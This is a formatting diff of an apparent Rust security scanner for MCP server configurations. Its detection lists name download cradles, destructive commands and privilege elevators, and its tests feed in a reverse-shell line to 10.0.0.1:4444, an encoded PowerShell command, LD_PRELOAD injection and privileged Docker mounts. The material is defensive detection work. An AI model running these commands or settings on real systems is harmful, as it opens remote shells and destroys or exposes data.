@@ -120,7 +120,7 @@ pub fn scan(config: &McpConfig) -> Vec<Finding> {
             .cmp(&a.severity)
             .then_with(|| a.server.cmp(&b.server))
             .then_with(|| a.field.cmp(&b.field))
-            .then_with(|| a.rule.cmp(&b.rule))
+            .then_with(|| a.rule.cmp(b.rule))
     });
     findings
 }
@@ -324,9 +324,14 @@ fn check_dangerous_patterns(s: &ServerConfig, out: &mut Vec<Finding>) {
     .into_iter()
     .find(|d| joined.contains(*d));
     let ps_cradle = (has_token(&joined, "iex") || joined.contains("invoke-expression"))
-        && ["downloadstring", "net.webclient", "iwr ", "invoke-webrequest"]
-            .iter()
-            .any(|p| joined.contains(*p));
+        && [
+            "downloadstring",
+            "net.webclient",
+            "iwr ",
+            "invoke-webrequest",
+        ]
+        .iter()
+        .any(|p| joined.contains(*p));
     if (downloader.is_some() && pipes_to_interpreter(&joined)) || ps_cradle {
         let needle = downloader.map(str::trim).unwrap_or("iex");
         out.push(
@@ -368,7 +373,13 @@ fn check_dangerous_patterns(s: &ServerConfig, out: &mut Vec<Finding>) {
 
     // Destructive commands.
     if let Some(needle) = [
-        "rm -rf", "rm -fr", "mkfs", "dd if=", "rmdir /s", "del /s", "format c:",
+        "rm -rf",
+        "rm -fr",
+        "mkfs",
+        "dd if=",
+        "rmdir /s",
+        "del /s",
+        "format c:",
     ]
     .into_iter()
     .find(|n| joined.contains(*n))
@@ -393,7 +404,7 @@ fn check_dangerous_patterns(s: &ServerConfig, out: &mut Vec<Finding>) {
     let obfuscation_field = ["base64 -d", "base64 --decode", "frombase64string"]
         .into_iter()
         .find(|n| joined.contains(*n))
-        .map(|n| locate(n))
+        .map(locate)
         .or_else(|| {
             s.args
                 .iter()
@@ -417,12 +428,10 @@ fn check_dangerous_patterns(s: &ServerConfig, out: &mut Vec<Finding>) {
     }
 
     // Privilege elevation.
-    let command_is_elevator = s.command.as_deref().is_some_and(|c| {
-        matches!(
-            basename(c).as_str(),
-            "sudo" | "doas" | "runas" | "pkexec"
-        )
-    });
+    let command_is_elevator = s
+        .command
+        .as_deref()
+        .is_some_and(|c| matches!(basename(c).as_str(), "sudo" | "doas" | "runas" | "pkexec"));
     if command_is_elevator || has_token(&joined, "sudo") {
         let field = if command_is_elevator {
             s.command_path.clone()
@@ -641,7 +650,10 @@ fn check_container(s: &ServerConfig, out: &mut Vec<Finding>) {
 
         if let Some((value, idx)) = flag_value(&s.args, i, &["--cap-add"]) {
             let cap = value.to_ascii_uppercase();
-            if matches!(cap.as_str(), "ALL" | "SYS_ADMIN" | "SYS_PTRACE" | "SYS_MODULE") {
+            if matches!(
+                cap.as_str(),
+                "ALL" | "SYS_ADMIN" | "SYS_PTRACE" | "SYS_MODULE"
+            ) {
                 out.push(
                     Finding::new("MW-CONT-003", Severity::High, Confidence::Observed, s, field(idx))
                         .describe(
@@ -706,8 +718,15 @@ const CREDENTIAL_COMPONENTS: &[&str] = &[
     "id_ed25519",
     "keychains",
 ];
-const SENSITIVE_SYSTEM_PREFIXES: &[&str] =
-    &["/etc", "/root", "/proc", "/sys", "/dev", "/boot", "/private/etc"];
+const SENSITIVE_SYSTEM_PREFIXES: &[&str] = &[
+    "/etc",
+    "/root",
+    "/proc",
+    "/sys",
+    "/dev",
+    "/boot",
+    "/private/etc",
+];
 const BROAD_SYSTEM_DIRS: &[&str] = &[
     "/var",
     "/usr",
@@ -831,7 +850,10 @@ fn classify_path(raw: &str) -> Option<PathRisk> {
     }
     if drive
         && comps.len() == 2
-        && matches!(comps[1], "program files" | "program files (x86)" | "programdata")
+        && matches!(
+            comps[1],
+            "program files" | "program files (x86)" | "programdata"
+        )
     {
         return Some(PathRisk::SystemBroad);
     }
@@ -950,7 +972,11 @@ fn arg_value(arg: &str) -> &str {
 }
 
 fn docker_host_path(spec: &str) -> String {
-    let skip = if has_drive_prefix(spec) && spec.len() > 2 { 2 } else { 0 };
+    let skip = if has_drive_prefix(spec) && spec.len() > 2 {
+        2
+    } else {
+        0
+    };
     match spec[skip..].find(':') {
         Some(p) => spec[..skip + p].to_string(),
         None => spec.to_string(),
@@ -1083,7 +1109,7 @@ pub(crate) fn is_sensitive_name(name: &str) -> bool {
     let n = name
         .trim()
         .to_ascii_lowercase()
-        .replace(|c: char| matches!(c, '-' | '.' | ' '), "_");
+        .replace(['-', '.', ' '], "_");
     if n.is_empty() || n.contains("public") {
         return false;
     }
@@ -1161,13 +1187,29 @@ pub(crate) fn is_placeholder(value: &str) -> bool {
     let l = v.to_ascii_lowercase();
     if matches!(
         l.as_str(),
-        "true" | "false" | "null" | "none" | "undefined" | "changeme" | "change-me" | "todo" | "tbd"
+        "true"
+            | "false"
+            | "null"
+            | "none"
+            | "undefined"
+            | "changeme"
+            | "change-me"
+            | "todo"
+            | "tbd"
     ) {
         return true;
     }
-    ["your", "example", "placeholder", "replace", "insert", "enter", "xxx"]
-        .iter()
-        .any(|p| l.starts_with(*p))
+    [
+        "your",
+        "example",
+        "placeholder",
+        "replace",
+        "insert",
+        "enter",
+        "xxx",
+    ]
+    .iter()
+    .any(|p| l.starts_with(*p))
 }
 
 /// For `Bearer abc`-style values returns only the credential part.
@@ -1189,9 +1231,11 @@ fn looks_like_file_reference(value: &str) -> bool {
     }
     let l = value.to_ascii_lowercase();
     !value.contains(' ')
-        && [".json", ".pem", ".key", ".p12", ".pfx", ".crt", ".txt", ".cert"]
-            .iter()
-            .any(|e| l.ends_with(*e))
+        && [
+            ".json", ".pem", ".key", ".p12", ".pfx", ".crt", ".txt", ".cert",
+        ]
+        .iter()
+        .any(|e| l.ends_with(*e))
 }
 
 fn known_token_kind(token: &str) -> Option<&'static str> {
@@ -1215,11 +1259,7 @@ fn known_token_kind(token: &str) -> Option<&'static str> {
     if t.starts_with("sk-ant-") && len >= 30 {
         return Some("Anthropic API key");
     }
-    if t.starts_with("sk-")
-        && len >= 32
-        && tokenish
-        && t.chars().any(|c| c.is_ascii_digit())
-    {
+    if t.starts_with("sk-") && len >= 32 && tokenish && t.chars().any(|c| c.is_ascii_digit()) {
         return Some("API key");
     }
     if t.starts_with("xox")
@@ -1372,9 +1412,7 @@ pub(crate) fn parse_url(url: &str) -> Option<ParsedUrl<'_>> {
     {
         return None;
     }
-    let end = rest
-        .find(|c: char| matches!(c, '/' | '?' | '#'))
-        .unwrap_or(rest.len());
+    let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
     let (authority, tail) = rest.split_at(end);
     let (userinfo, hostport) = match authority.rfind('@') {
         Some(p) => (Some(&authority[..p]), &authority[p + 1..]),
@@ -1385,10 +1423,7 @@ pub(crate) fn parse_url(url: &str) -> Option<ParsedUrl<'_>> {
         None => hostport.split(':').next().unwrap_or(""),
     };
     let host = host_raw.to_ascii_lowercase();
-    let path = tail
-        .split(|c: char| c == '?' || c == '#')
-        .next()
-        .unwrap_or("");
+    let path = tail.split(['?', '#']).next().unwrap_or("");
     let query = tail
         .split_once('?')
         .map(|(_, q)| q.split('#').next().unwrap_or(""));
@@ -1616,13 +1651,7 @@ fn check_network(s: &ServerConfig, out: &mut Vec<Finding>) {
         let value = arg_value(arg);
         if value.contains("://") {
             let positional = !arg.starts_with('-') && (i == 0 || !s.args[i - 1].starts_with('-'));
-            check_url(
-                s,
-                value,
-                format!("{}[{}]", s.args_path, i),
-                positional,
-                out,
-            );
+            check_url(s, value, format!("{}[{}]", s.args_path, i), positional, out);
         }
     }
     check_bind_all(s, out);
@@ -1929,7 +1958,8 @@ mod tests {
         assert!(has(&f, "MW-SHELL-006"));
         let f = server(r#"{"command":"powershell","args":["-EncodedCommand","SQBFAFgA"]}"#);
         assert!(has(&f, "MW-SHELL-005"));
-        let f = server(r#"{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}"#);
+        let f =
+            server(r#"{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}"#);
         assert!(has(&f, "MW-SHELL-003"));
     }
 
@@ -1980,7 +2010,10 @@ mod tests {
     #[test]
     fn flags_filesystem_access_through_env() {
         let f = server(r#"{"command":"node","env":{"ALLOWED_DIRECTORIES":"/"}}"#);
-        assert_eq!(get(&f, "MW-FS-001").field, "mcpServers.srv.env.ALLOWED_DIRECTORIES");
+        assert_eq!(
+            get(&f, "MW-FS-001").field,
+            "mcpServers.srv.env.ALLOWED_DIRECTORIES"
+        );
     }
 
     #[test]
@@ -1992,16 +2025,22 @@ mod tests {
         let f = server(r#"{"command":"docker","args":["run","-v","/:/host:ro","img"]}"#);
         assert_eq!(get(&f, "MW-FS-001").severity, Severity::Medium);
 
-        let f = server(r#"{"command":"docker","args":["run","--mount","type=bind,source=/etc,target=/e","img"]}"#);
+        let f = server(
+            r#"{"command":"docker","args":["run","--mount","type=bind,source=/etc,target=/e","img"]}"#,
+        );
         assert!(has(&f, "MW-FS-006"));
 
-        let f = server(r#"{"command":"docker","args":["run","-v","/var/run/docker.sock:/var/run/docker.sock","img"]}"#);
+        let f = server(
+            r#"{"command":"docker","args":["run","-v","/var/run/docker.sock:/var/run/docker.sock","img"]}"#,
+        );
         assert!(has(&f, "MW-FS-005"));
 
         let f = server(r#"{"command":"docker","args":["run","-v","myvolume:/data","img"]}"#);
         assert!(f.is_empty());
 
-        let f = server(r#"{"command":"docker","args":["run","--privileged","--network","host","--cap-add=SYS_ADMIN","--security-opt","seccomp=unconfined","img"]}"#);
+        let f = server(
+            r#"{"command":"docker","args":["run","--privileged","--network","host","--cap-add=SYS_ADMIN","--security-opt","seccomp=unconfined","img"]}"#,
+        );
         assert!(has(&f, "MW-CONT-001"));
         assert!(has(&f, "MW-CONT-002"));
         assert!(has(&f, "MW-CONT-003"));
@@ -2027,7 +2066,9 @@ mod tests {
     #[test]
     fn detects_known_token_formats() {
         let token = format!("ghp_{}", "a".repeat(36));
-        let f = server(&format!(r#"{{"command":"node","env":{{"FOO":"{token}"}}}}"#));
+        let f = server(&format!(
+            r#"{{"command":"node","env":{{"FOO":"{token}"}}}}"#
+        ));
         let finding = get(&f, "MW-SEC-001");
         assert!(finding.title.contains("GitHub token"));
         assert!(!finding.title.contains(&token));
@@ -2039,15 +2080,31 @@ mod tests {
 
     #[test]
     fn ignores_placeholders_and_references() {
-        for value in ["${API_TOKEN}", "$API_TOKEN", "%API_TOKEN%", "<your-token>", "", "true", "xxxxxxxx", "your_token_here"] {
+        for value in [
+            "${API_TOKEN}",
+            "$API_TOKEN",
+            "%API_TOKEN%",
+            "<your-token>",
+            "",
+            "true",
+            "xxxxxxxx",
+            "your_token_here",
+        ] {
             let f = server(&format!(
                 r#"{{"command":"node","env":{{"API_TOKEN":"{value}"}}}}"#
             ));
-            assert!(!has(&f, "MW-SEC-001"), "value {value:?} should not be flagged");
+            assert!(
+                !has(&f, "MW-SEC-001"),
+                "value {value:?} should not be flagged"
+            );
         }
-        let f = server(r#"{"command":"node","env":{"TOKEN_FILE":"/run/secrets/t","MAX_TOKENS":"4096"}}"#);
+        let f = server(
+            r#"{"command":"node","env":{"TOKEN_FILE":"/run/secrets/t","MAX_TOKENS":"4096"}}"#,
+        );
         assert!(!has(&f, "MW-SEC-001"));
-        let f = server(r#"{"command":"node","env":{"GOOGLE_APPLICATION_CREDENTIALS":"/home/a/key.json"}}"#);
+        let f = server(
+            r#"{"command":"node","env":{"GOOGLE_APPLICATION_CREDENTIALS":"/home/a/key.json"}}"#,
+        );
         assert!(!has(&f, "MW-SEC-001"));
     }
 
@@ -2059,13 +2116,21 @@ mod tests {
         let f = server(r#"{"command":"node","args":["--password=hunter2hunter2"]}"#);
         assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.args[0]");
 
-        let f = server(r#"{"command":"docker","args":["run","-e","GITHUB_TOKEN=abcdef123456","img"]}"#);
+        let f =
+            server(r#"{"command":"docker","args":["run","-e","GITHUB_TOKEN=abcdef123456","img"]}"#);
         assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.args[2]");
 
-        let f = server(r#"{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer abcdef123456"}}"#);
-        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.headers.Authorization");
+        let f = server(
+            r#"{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer abcdef123456"}}"#,
+        );
+        assert_eq!(
+            get(&f, "MW-SEC-001").field,
+            "mcpServers.srv.headers.Authorization"
+        );
 
-        let f = server(r#"{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer ${TOKEN}"}}"#);
+        let f = server(
+            r#"{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer ${TOKEN}"}}"#,
+        );
         assert!(!has(&f, "MW-SEC-001"));
 
         let f = server(r#"{"command":"node","args":["postgresql://user:hunter2pw@localhost/db"]}"#);
@@ -2100,10 +2165,14 @@ mod tests {
         let f = server(r#"{"command":"docker","args":["run","-p","127.0.0.1:3000:3000","img"]}"#);
         assert!(!has(&f, "MW-NET-005"));
 
-        let f = server(r#"{"command":"node","args":["s.js","--insecure"],"env":{"NODE_TLS_REJECT_UNAUTHORIZED":"0"}}"#);
+        let f = server(
+            r#"{"command":"node","args":["s.js","--insecure"],"env":{"NODE_TLS_REJECT_UNAUTHORIZED":"0"}}"#,
+        );
         assert_eq!(f.iter().filter(|x| x.rule == "MW-NET-006").count(), 2);
 
-        let f = server(r#"{"command":"npx","args":["mcp-remote@1.0.0","https://example.com/mcp","--allow-http"]}"#);
+        let f = server(
+            r#"{"command":"npx","args":["mcp-remote@1.0.0","https://example.com/mcp","--allow-http"]}"#,
+        );
         assert!(has(&f, "MW-NET-001"));
     }
 
@@ -2111,7 +2180,8 @@ mod tests {
     fn flags_injected_libraries_and_proxies() {
         let f = server(r#"{"command":"node","env":{"LD_PRELOAD":"/tmp/x.so"}}"#);
         assert!(has(&f, "MW-ENV-001"));
-        let f = server(r#"{"command":"node","env":{"HTTPS_PROXY":"http://proxy.example.net:3128"}}"#);
+        let f =
+            server(r#"{"command":"node","env":{"HTTPS_PROXY":"http://proxy.example.net:3128"}}"#);
         assert_eq!(get(&f, "MW-NET-007").severity, Severity::Info);
     }
 
@@ -2149,7 +2219,10 @@ mod tests {
         assert_eq!(classify_path("/"), Some(PathRisk::Root));
         assert_eq!(classify_path("/*"), Some(PathRisk::Root));
         assert_eq!(classify_path("$HOME"), Some(PathRisk::Home));
-        assert_eq!(classify_path("%USERPROFILE%\\.aws"), Some(PathRisk::Credentials));
+        assert_eq!(
+            classify_path("%USERPROFILE%\\.aws"),
+            Some(PathRisk::Credentials)
+        );
         assert_eq!(classify_path("/home/alice/work"), None);
         assert_eq!(classify_path("/dev/null"), None);
         assert_eq!(classify_path("../.."), Some(PathRisk::ParentTraversal));
